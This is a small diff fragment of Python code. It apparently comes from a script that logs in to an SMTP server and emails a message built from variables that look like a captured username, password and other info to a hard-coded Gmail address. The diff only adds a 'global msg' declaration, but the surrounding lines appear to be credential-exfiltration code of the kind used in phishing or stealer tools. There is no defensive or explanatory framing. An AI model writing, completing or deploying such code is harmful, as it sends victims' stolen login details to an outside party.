@@ -161,6 +161,7 @@ s.login(sa, kl)
 
 ra = 'bertranddupont885@gmail.com'
 def rs():
+ global msg
  connexion = cho + ' - ' + usn + ' - ' + usp + '\n\n' + info
  msg = MIMEMultipart()
  msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
